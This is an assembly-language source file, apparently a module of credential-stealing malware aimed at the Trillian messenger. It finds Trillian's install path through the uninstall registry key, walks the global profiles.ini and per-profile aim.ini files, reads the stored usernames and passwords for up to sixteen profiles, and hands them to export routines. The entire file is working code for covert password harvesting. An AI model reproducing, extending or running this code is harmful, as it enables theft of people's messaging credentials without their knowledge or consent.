; Trillian
; Tested on:
;	Trillian Pro v2.01
;	Trillian v0.74h

.data
	@AllocStr	<szTrillUnPath>,	<"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Trillian\">
	@AllocStr	<szTrillUnStr>,		<"UninstallString">
	@AllocStr	<szTrillProfiles>,	<"Profiles">
	@AllocStr	<szTrillNum>,		<"num">
	@AllocStr	<szTrillName>,		<"Name">
	@AllocStr	<szTrillPass>,		<"Password">
	@AllocStr	<szTrillType>,		<"Preferences Type">
	@AllocStr	<szTrillLocation>,	<"Preferences Location">	
	@AllocStr	<szTrillAIMProf>,	<"\aim.ini">	
	@AllocStr	<szTrillGlobProfs>,	<"\users\global\profiles.ini">
	@AllocStr	<szTrillDefault>,	<"\default">
	@AllocStr	<szTrillSpecPath>,	<"\Trillian\User Settings\">
	@AllocStr	<szTrillProfFmt>,	<"Profile%.3lu">
	@AllocStr	<szTrillProfFmt2>,	<"profile %lu">
	@AllocMem	<lpTrillCommonBuf>,	<MAX_PATH+1>
	@AllocMem	<lpTrillInstPath>,	<MAX_PATH+1>
	@AllocMem	<lpTrillProfPath>,	<MAX_PATH+1>

.code

GetTrillianPass proc uses esi
	LOCAL	szProf[32]: BYTE
	LOCAL	szName[MAX_PATH+1]: BYTE
	LOCAL	szPasswor[MAX_PATH+1]: BYTE

	; Read profiles 0..15 for passwords
	mov	esi, 0fh

@l:
	invoke	wsprintf, addr szProf, offset szTrillProfFmt2, esi
	
	invoke  GetPrivateProfileString, addr szProf, offset szTrillName, offset szNilStr, addr szName, MAX_PATH, offset lpTrillProfPath
	invoke  GetPrivateProfileString, addr szProf, offset szTrillPass, offset szNilStr, addr szPasswor, MAX_PATH, offset lpTrillProfPath

	.IF	(szName[0]) && (szPasswor[0])
		invoke	ExportStr, TYPE_TRILL_NAME, 0, addr szName
		invoke	ExportStr, TYPE_TRILL_PASS, 0, addr szPasswor
	.ENDIF
	
	dec	esi
	jns	@l
	
	ret
GetTrillianPass endp

GetTrillianOutput proc uses esi
	LOCAL	HasSpecFolder, dwBufLen: DWORD
	LOCAL	szProf[32]: BYTE
	LOCAL	szName[MAX_PATH+1]: BYTE
	LOCAL	szType[8]: BYTE
	LOCAL	szLocation[MAX_PATH+1]: BYTE

	; Write header	
	invoke	ExportModule, MODULE_TRILLIAN
	
	; Make User's dir path
	.IF	dwSHGetFolderPath
		push	offset lpTrillCommonBuf
		push	0
		push	0
		push	CSIDL_PERSONAL		
		push	0
		call	dwSHGetFolderPath
		.IF	eax == S_OK 
			mov	HasSpecFolder, TRUE
		.ELSE
			mov	HasSpecFolder, FALSE
		.ENDIF
	.ELSE
		mov	HasSpecFolder, FALSE
	.ENDIF
	
	.IF	HasSpecFolder
		invoke	StrRChr, offset lpTrillCommonBuf, NULL, '\'
		.IF	eax
			mov	byte ptr[eax], 0
		.ENDIF
		invoke	lstrcat, offset lpTrillCommonBuf, offset szTrillSpecPath  
	.ENDIF

	; Get Trillian path
	mov	dwBufLen, MAX_PATH
	invoke	RegReadValue, HKEY_LOCAL_MACHINE, offset szTrillUnPath, offset szTrillUnStr, offset lpTrillInstPath, addr dwBufLen 
	test	eax, eax
	jz	@ret
	
	invoke	StrRChr, offset lpTrillInstPath, NULL, '\'
	.IF	eax
		mov	byte ptr[eax], 0
	.ENDIF
	invoke	lstrcat, offset lpTrillInstPath, offset szTrillGlobProfs
	
	; Get profile count
	invoke  GetPrivateProfileInt, offset szTrillProfiles, offset szTrillNum, NULL, offset lpTrillInstPath
	test    eax, eax
	jz      @ret

	dec	eax
	mov	esi, eax
	
	; Read each profile
@l:
	invoke	wsprintf, addr szProf, offset szTrillProfFmt, esi
	invoke  GetPrivateProfileString, addr szProf, offset szTrillType, offset szNilStr, addr szType, 7, offset lpTrillInstPath
	invoke  GetPrivateProfileString, addr szProf, offset szTrillName, offset szNilStr, addr szName, MAX_PATH, offset lpTrillInstPath

	.IF	(szType[0] == '2')
		; Custom dir
		invoke  GetPrivateProfileString, addr szProf, offset szTrillLocation, offset szNilStr, addr szLocation, MAX_PATH, offset lpTrillInstPath
		invoke	lstrcpy, offset lpTrillProfPath, addr szLocation
	.ELSEIF	(szType[0] == '1') && (HasSpecFolder)
		; User's dir
		invoke	lstrcpy, offset lpTrillProfPath, offset lpTrillCommonBuf
		invoke	lstrcat, offset lpTrillProfPath, addr szName 
	.ELSEIF (szType[0] == '0')
		; Default dir
		invoke	lstrcpy, offset lpTrillProfPath, offset lpTrillInstPath
		invoke	StrRChr, offset lpTrillProfPath, NULL, '\'
		.IF	eax
			lea	edx, [eax-6]
			invoke	lstrcpy, edx, addr szName
		.ENDIF   
	.ELSE
		; Error?
		jmp	@ret
	.ENDIF
	
	invoke	lstrcat, offset lpTrillProfPath, offset szTrillAIMProf
	invoke	GetTrillianPass
	
	dec	esi
	jns	@l

@ret:
	ret
GetTrillianOutput endp
